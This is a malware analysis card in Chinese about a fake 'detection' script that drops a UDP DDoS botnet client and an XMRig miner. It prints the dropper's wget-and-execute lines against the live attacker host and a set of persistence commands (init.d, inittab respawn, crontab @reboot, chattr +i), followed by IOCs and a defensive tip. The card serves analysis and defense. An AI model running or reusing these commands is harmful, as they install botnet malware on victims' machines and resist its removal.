# 伪造检测脚本投放 DDoS 僵尸网络 + XMRig

- Source report: `情梦后门 rar`
- Full report: `domains/reverse-engineering/case-reports/qingmeng-fake-detector-botnet`
- Techniques: malware, telegram
- Fused: 2026-09-17

## Key findings (distilled)

- **分析日期**: 2026-08-08
- **目标URL**: `http://wzjc.ipwz666.space/run.sh`
- **分析方式**: 纯静态分析，未运行任何样本
- **分析人**: 破晓安全中心 https://t.me/ZeroDawnTeam
- ---
- **此伪造检测脚本除了上报IP，也是 DDoS 僵尸网络客户端 + 门罗币矿机的投放器。**
- 以"伪造检测"为幌子，诱导用户执行 `run.sh`，实际下载并运行：
- 1. **UDP DDoS 攻击客户端**（`client`，已从服务器删除）- 带远程命令执行后门
- 2. **XMRig 门罗币矿机**（`filter`，仍在服务器上）- 驻留挖矿
- 服务器 `wzjc.ipwz666.space` 意外暴露了完整 home 目录列表，使全量取证成为可能。
- ---
- **文件**: `run.sh` (226 bytes)

## Repro snippets

```
# 下载客户端
echo "正在下载客户端..."
wget -P /root http://wzjc.ipwz666.space/client -O /root/client

# 修改权限并运行
echo "正在修改文件权限并运行客户端..."
chmod 777 /root/client
/root/client
ip-api.com
GET /json HTTP/1.0
Host: ip-api.com
Connection: close
"query"
"country"
# init.d 服务
/etc/init.d/udpclient
update-rc.d udpclient defaults >/dev/null 2>&1 || chkconfig --add udpclient

# inittab 持久驻留（被杀自动重启）
zombie:2345:respawn:udpclient

# /etc/profile（每次登录触发）
（profile 文件末尾追加 /usr/bin/udpclient）

# crontab @reboot
@reboot %s >/dev/null 2>&1
crontab -l 2>/dev/null > /tmp/.cronudp
crontab /tmp/.cronudp && rm -f /tmp/.cronudp

# 不可变属性（防止删除）
chattr +i %s 2>/dev/null
chattr +i /etc/init.d/udpclient 2>/dev/null
chattr +i /etc/inittab 2>/dev/null
chattr +i /etc/profile 2>/d
```

## When to reuse

- 同类标签命中：malware, telegram
- 先读本卡片，再打开 Full report 复现细节

@TGSEC社区 · @TGSEC-Qtzuu 整理

## IOC / 手法要点
- 诱饵：`run.sh` 伪称检测，实际 `wget` 拉 `client` 并以 root 执行
- 载荷：UDP DDoS 客户端（含远程命令）+ XMRig 门罗挖矿（`filter`）
- 架构：x86_64 + mipsel（路由器/IoT）交叉编译痕迹
- 取证：服务器误暴露 home 目录 → 全量样本/strings/authorized_keys
- **防御**：勿执行来路不明的“检测脚本”；查 `xmrig`/`filter`/`udpclient` 进程与 crontab
